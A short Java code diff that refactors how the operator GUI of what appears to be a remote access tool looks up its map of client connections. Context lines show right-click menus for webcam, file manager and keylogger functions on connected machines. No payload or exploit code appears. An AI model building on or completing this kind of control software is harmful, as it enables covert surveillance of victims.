@@ -117,7 +117,7 @@ public class TablePopUpListener extends MouseAdapter {
 
 
         JTable connectionsTable = mainGUI.getConnectionsTable();
-        ConcurrentHashMap<Socket, Streams> mapOfConnections = mainGUI.getMap();
+        ConcurrentHashMap<Socket, Streams> mapOfConnections = Main.server.getMap();
         // set actions
         webcamMenu.addActionListener(new WebcamMenuListener(connectionsTable, mapOfConnections, mainGUI));
         fileManagerMenu.addActionListener(new FileManagerMenuListener(connectionsTable, mapOfConnections, mainGUI));
@@ -150,7 +150,7 @@ public class TablePopUpListener extends MouseAdapter {
             if (!source.isRowSelected(row)) source.changeSelection(row, column, false, false);
             if (mainGUI.getConnectionsDefaultTableModel().getValueAt(row, 5).equals("Connected")) {
                 connectedPopUpMenu.show(e.getComponent(), e.getX(), e.getY());
-                Streams stream = GetSYS.getStream(Main.gui.getMap(), Main.gui.getConnectionsTable());
+                Streams stream = GetSYS.getStream(Main.server.getMap(), Main.gui.getConnectionsTable());
                 assert stream != null;
                 webcamMenu.setVisible(stream.getTempSystemInformation().WEBCAM());
                 keyloggerMenuOptions.setVisible(stream.getTempSystemInformation().KEYLOGGER());
